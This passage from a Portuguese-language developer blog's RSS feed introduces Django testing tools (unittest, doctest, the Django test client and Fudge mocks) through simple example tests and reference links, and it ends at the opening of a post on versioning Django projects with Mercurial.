&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;FakeOAuthApi&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;FakeOAuthApi&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;expects_call&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;with_args&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;returns_fake&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;expects&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;UpdateStatus&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;with_arg_count&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

post_msg_to_twitter&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hey there fellow testing freaks!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Sabendo que valores serão passados, e quais os resultados,
podemos simular o comportamento daquele serviço. Prático, não?&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Estas são as ferramentas que eu costumo utilizar em meus projetos
&lt;em&gt;Python/Django&lt;/em&gt;. É claro que existem outras, na verdade existem várias.
Tenha em mente que a ferramenta é apenas um meio de garantir, através de
testes, que você está guiando a sua aplicação para o lugar certo. Os
testes automatizados no final servem para garantir que ela ainda segue
este caminho, que contribuições realizadas tardiamente não “quebraram” o
comportamento que você escreveu no início do desenvolvimento.&lt;/p&gt;
&lt;p&gt;Tenho a intenção de escrever um &lt;em&gt;post&lt;/em&gt; mais prático sobre testes e
&lt;em&gt;Django&lt;/em&gt;. Fiquem no aguardo ;)&lt;/p&gt;
&lt;p&gt;E você? Tem alguma ferramenta para recomendar? Utilize os comentários
abaixo para compartilhá-la.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://cilliano.com/blog/2011/02/07/django-bdd-with-lettuce-and-splinter/&quot; title=&quot;Leia sobre Django, BDD, Lettuce e Splinter&quot;&gt;&lt;em&gt;CillianO – Django Full Stack Testing and BDD with Lettuce and Splinter&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.dtsato.com/blog/work/introduzindo_desenvolvimento_orientado_comportamento_bdd/&quot; title=&quot;Não sabe o que é BDD? Conheça neste artigo de Danilo Sato&quot;&gt;&lt;em&gt;Danilo Sato&lt;/em&gt; – Introduzindo Desenvolvimento Orientado por Comportamento &lt;em&gt;BDD&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/jbalogh/django-nose&quot; title=&quot;Visite o repositório do django-nose no GitHub&quot;&gt;&lt;em&gt;django-nose – GitHub repository&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://farmdev.com/projects/fudge/using-fudge.html#fudging-a-web-service&quot; title=&quot;Documentação oficial do Fudge&quot;&gt;&lt;em&gt;Fudge – Using Fudge&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://jpz-log.info/archives/2010/06/08/nose-testing-in-python-made-easy/&quot; title=&quot;Testes em Python passam a ser mais fáceis com nose&quot;&gt;&lt;em&gt;JPz’log – nose: Testing in Python made easy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://somethingaboutorange.com/mrl/projects/nose/1.0.0/writing_tests.html&quot; title=&quot;Aprenda a escrever testes Python com o Nose&quot;&gt;&lt;em&gt;Nose – Writing tests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://splinter.cobrateam.info/&quot; title=&quot;Conheça o projeto Splinter, e envolva-se&quot;&gt;&lt;em&gt;Splinter – Test framework for web applications&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Ferramentas de testes em Django - Parte 1]]></title><description><![CDATA[Dando continuidade à série
“Montando seu ambiente de desenvolvimento Django no Linux“, vou
indicar algumas ferramentas de testes para que você também possa deixar
com que os testes guiem o desenvolvimento de suas aplicações. Afinal, testar é preciso ;) Testar em Django é possível? Sem dúvida nenhuma…]]></description><link>https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/07/18/ferramentas-de-testes-em-django-parte-1.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Mon, 18 Jul 2011 22:06:00 GMT</pubDate><content:encoded>&lt;p&gt;Dando continuidade à série
“&lt;a href=&quot;/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html&quot; title=&quot;Veja outros posts desta série&quot;&gt;Montando seu ambiente de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;“, vou
indicar algumas ferramentas de testes para que você também possa deixar
com que os &lt;a href=&quot;/2011/01/27/tdd-desenvolvimento-orientado-testes.html&quot; title=&quot;TDD: Desenvolvimento Orientado a Testes&quot;&gt;testes guiem o desenvolvimento de suas aplicações&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Afinal, testar é preciso ;)&lt;/p&gt;
&lt;h2&gt;Testar em Django é possível?&lt;/h2&gt;
&lt;p&gt;Sem dúvida nenhuma! Mas não espere que o &lt;em&gt;framework&lt;/em&gt; adeque-se a você,
você precisa ter a iniciativa de tentar compreender as melhores maneiras
para escrever testes em &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Por exemplo, se você tem por hábito isolar os modelos para &lt;a href=&quot;/tag/testes.html&quot; title=&quot;Leia mais sobre testes&quot;&gt;testá-los&lt;/a&gt;
de forma unitária, pode passar por certa dor de cabeça com o
&lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; / &lt;em&gt;Django&lt;/em&gt;. Não que seja impossível, mas o comportamento
&lt;em&gt;default&lt;/em&gt; do &lt;em&gt;framework&lt;/em&gt; é criar uma base de dados “fake” para você não
precisar ter este trabalho.&lt;/p&gt;
&lt;p&gt;Enfim, talvez a forma de &lt;strong&gt;utilizar&lt;/strong&gt; estas ferramentas &lt;strong&gt;caiba em um
outro &lt;em&gt;post&lt;/em&gt;&lt;/strong&gt;, o objetivo deste é &lt;strong&gt;apenas apresentá-las&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;unittest – Testando unidades através de classes&lt;/h2&gt;
&lt;p&gt;A &lt;a href=&quot;http://docs.python.org/library/unittest.html&quot; title=&quot;unittest — Unit testing framework&quot;&gt;&lt;em&gt;unittest&lt;/em&gt;&lt;/a&gt; é uma biblioteca padrão do &lt;em&gt;Python&lt;/em&gt; que ajuda (e muito)
a escrever testes automatizados com a linguagem.&lt;/p&gt;
&lt;p&gt;Os testes são escritos através de classes, onde utilizamos os esquemas
de &lt;a href=&quot;http://docs.python.org/library/unittest.html#assert-methods&quot; title=&quot;Veja a lista de asserts da unittest&quot;&gt;&lt;em&gt;assertions&lt;/em&gt;&lt;/a&gt; para garantir o comportamento do código testado
(nenhuma novidade até aqui). Para quem utiliza testes unitários no
&lt;em&gt;Java&lt;/em&gt; não vai sentir grandes mudanças na abordagem, já que a &lt;em&gt;unittest&lt;/em&gt;
é inspirada na &lt;a href=&quot;http://javafree.uol.com.br/wiki/JUnit&quot; title=&quot;Leia mais sobre a JUnit&quot;&gt;&lt;em&gt;JUnit&lt;/em&gt;&lt;/a&gt; (sendo muitas vezes até chamada de &lt;em&gt;PyUnit&lt;/em&gt;):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; unittest
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; myapp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;models &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; Animal

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;AnimalTestCase&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;unittest&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;TestCase&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setUp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lion &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Animal&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;create&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;lion&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; sound&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;roar&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cat &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Animal&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;create&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;cat&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; sound&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;meow&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;testSpeaking&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;assertEquals&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lion&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;speak&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;The lion says &quot;roar&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;assertEquals&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cat&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;speak&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;The cat says &quot;meow&quot;&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O &lt;em&gt;test runner&lt;/em&gt; padrão do &lt;em&gt;Django&lt;/em&gt; irá procurar por subclasses de
&lt;code class=&quot;language-text&quot;&gt;unittest.TestCase&lt;/code&gt; nos arquivos &lt;code class=&quot;language-text&quot;&gt;models.py&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;tests.py&lt;/code&gt;. A suíte
de testes tenta facilitar ao máximo a sua vida… execute a seguinte
instrução e confira se a sua aplicação está &lt;em&gt;ok&lt;/em&gt; ou não:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py test&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;Peraí que não acabou! Apresentando a TestCase&lt;/h3&gt;
&lt;p&gt;Testar aplicações &lt;a href=&quot;/tag/desenvolvimento-web.html&quot; title=&quot;Leia mais sobre Web&quot;&gt;&lt;em&gt;Web&lt;/em&gt;&lt;/a&gt; com a &lt;em&gt;unittest&lt;/em&gt; pode ser dureza. Pensando
nisso o &lt;em&gt;Django&lt;/em&gt; disponibiliza a &lt;code class=&quot;language-text&quot;&gt;TestCase&lt;/code&gt;, que estende a &lt;em&gt;unittest&lt;/em&gt;
adicionando funcionalidades como carregamento de &lt;em&gt;fixtures&lt;/em&gt;, roteamento
de &lt;em&gt;urls&lt;/em&gt; e um &lt;em&gt;client&lt;/em&gt; para fazer requisições &lt;em&gt;Web&lt;/em&gt; e testar as suas
&lt;em&gt;views&lt;/em&gt; (o &lt;em&gt;TestClient&lt;/em&gt;, detalhado mais abaixo).&lt;/p&gt;
&lt;h2&gt;doctest – Testando através de docstrings&lt;/h2&gt;
&lt;p&gt;Admito que escrever documentação de &lt;em&gt;software&lt;/em&gt; não é o meu forte… mas
com &lt;em&gt;doctests&lt;/em&gt; pode-se documentar métodos ao mesmo tempo em que
escreve-se testes!&lt;/p&gt;
&lt;p&gt;A &lt;a href=&quot;http://docs.python.org/library/doctest.html&quot; title=&quot;Leia mais sobre a doctest&quot;&gt;&lt;em&gt;doctest&lt;/em&gt;&lt;/a&gt; é uma biblioteca padrão do &lt;em&gt;Python&lt;/em&gt; que procura e
interpreta &lt;a href=&quot;http://www.python.org/dev/peps/pep-0257/&quot; title=&quot;Entenda o que é uma docstring&quot;&gt;&lt;em&gt;docstrings&lt;/em&gt;&lt;/a&gt; na aplicação. A sintaxe nesses trechos de
&lt;em&gt;docstrings&lt;/em&gt; é diferenciada, simulando um interpretador interativo do
&lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# models.py&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; models

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Animal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Model&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token triple-quoted-string string&quot;&gt;&quot;&quot;&quot;
  An animal that knows how to make noise

  # Create some animals
  &gt;&gt;&gt; lion = Animal.objects.create(name=&quot;lion&quot;, sound=&quot;roar&quot;)
  &gt;&gt;&gt; cat = Animal.objects.create(name=&quot;cat&quot;, sound=&quot;meow&quot;)

  # Make &apos;em speak
  &gt;&gt;&gt; lion.speak()
  &apos;The lion says &quot;roar&quot;&apos;
  &gt;&gt;&gt; cat.speak()
  &apos;The cat says &quot;meow&quot;&apos;
  &quot;&quot;&quot;&lt;/span&gt;
  name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
  sound &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; models&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;CharField&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;max_length&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;speak&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;The %s says &quot;%s&quot;&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sound&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Assim como com a &lt;em&gt;unittest&lt;/em&gt;, o &lt;em&gt;test runner&lt;/em&gt; padrão do &lt;em&gt;Django&lt;/em&gt;
procurará por ocorrências de &lt;em&gt;docstests&lt;/em&gt; em &lt;code class=&quot;language-text&quot;&gt;models.py&lt;/code&gt; e
&lt;code class=&quot;language-text&quot;&gt;tests.py&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Django Test Client – Testando a sua aplicação como se fosse um navegador&lt;/h2&gt;
&lt;p&gt;E como fazer para testar requisições &lt;em&gt;Web&lt;/em&gt;? Por exemplo, você não quer
testar a sua &lt;em&gt;view&lt;/em&gt; de forma isolada, quer testar desde a parte de
roteamento ao comportamento com o banco de dados, como se você se
estivesse realmente visitando a página. Neste caso entra a &lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/testing/#module-django.test.client&quot; title=&quot;Testando aplicações Django com requisições Web falsas&quot;&gt;&lt;em&gt;test
client&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Toda a classe &lt;code class=&quot;language-text&quot;&gt;TestCase&lt;/code&gt; possui uma instância da &lt;strong&gt;Django Test
Client&lt;/strong&gt;. Então escrever testes com requisições à sua aplicação fica
muito simples utilizando classes:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;test &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; TestCase

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;SimpleTest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;TestCase&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test_details&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;/customer/details/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;assertEqual&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;status_code&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;test_index&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;client&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;/customer/index/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;assertEqual&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;response&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;status_code&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;É perfeitamente possível utilizar a &lt;strong&gt;test client&lt;/strong&gt; em &lt;em&gt;doctests&lt;/em&gt;
também:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token triple-quoted-string string&quot;&gt;&quot;&quot;&quot;
&gt;&gt;&gt; from django.test.client import Client
&gt;&gt;&gt; c = Client()
&gt;&gt;&gt; response = c.post(&apos;/login/&apos;, {&apos;username&apos;: &apos;john&apos;,
...        &apos;password&apos;: &apos;smith&apos;})
&gt;&gt;&gt; response.status_code
200
&quot;&quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Particularmente, tive a oportunidade de implementar testes unitários já
no início do meu aprendizado em &lt;em&gt;Django&lt;/em&gt;. Deixar os testes te guiarem é
uma prática excelente!&lt;/p&gt;
&lt;p&gt;Tudo parte do bom senso, óbvio. Nenhum processo ou ferramenta deveria
substituir o “feeling” do profissional… também não é muito sadio ser
extremamente “by the book“. Mas se puder utilizar testes para guiar o
seu desenvolvimento, use-os!&lt;/p&gt;
&lt;p&gt;Na segunda parte deste &lt;em&gt;post&lt;/em&gt; pretendo apresentar algumas ferramentas
que irão turbinar ainda mais o seu desenvolvimento orientado a testes.&lt;/p&gt;
&lt;p&gt;Até lá!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.1/topics/testing/#writing-unit-tests&quot; title=&quot;Leia direto da fonte como escrever testes em Django&quot;&gt;&lt;em&gt;Django Documentation – Writing unit tests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.1/topics/testing/#writing-doctests&quot; title=&quot;Leia direto da fonte sobre como escrever testes com docstrings&quot;&gt;&lt;em&gt;Django Documentation – Writing doctests&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/1.1/topics/testing/#testcase&quot; title=&quot;Entenda a diferença entre unittest do Python e o TestCase do Django&quot;&gt;&lt;em&gt;Django Documentation – TestCase&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.python.org/library/unittest.html&quot; title=&quot;Leia sobre a unittest direto da documentação do Python&quot;&gt;&lt;em&gt;Python Documentation – unittest: Unit testing framework&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://dougalmatthews.com/articles/2010/jan/20/testing-your-first-django-app/&quot; title=&quot;Aprenda a testar a sua primeira aplicação em Django&quot;&gt;&lt;em&gt;Dougal Matthews – Testing your first Django app&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://kokoko.fluxionary.net/testing-django-part-1-nose&quot; title=&quot;O Konrad apresenta algumas ferramentas muito boas para testes com Django&quot;&gt;&lt;em&gt;Konrad’s Kode, Konfigs &amp;#x26; Konstructions – Testing Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.marinhobrandao.com/blog/programacao-dirigida-a-testes-no-django/&quot; title=&quot;Aprenda Django de uma forma divertida com o Marinho&quot;&gt;&lt;em&gt;Marinho Brandão&lt;/em&gt; – Programação dirigida a testes no &lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Como versionar projetos Django com o Mercurial - Parte 3]]></title><description><![CDATA[Dando continuidade a micro-série Como versionar projetos \Django_ com o
Mercurial (confira a parte 1 e a parte 2), vamos finalizar com
um exemplo prático de um projeto Django usando o Mercurial. Começando… Vamos reutilizar a estrutura dos posts anteriores. Para isso, inicie
um projeto com o…]]></description><link>https://klauslaube.com.br/2011/06/04/como-versionar-projetos-django-mercurial-parte-3.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/06/04/como-versionar-projetos-django-mercurial-parte-3.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sat, 04 Jun 2011 10:27:00 GMT</pubDate><content:encoded>&lt;p&gt;Dando continuidade a micro-série &lt;em&gt;Como versionar projetos \&lt;/em&gt;Django_ com o
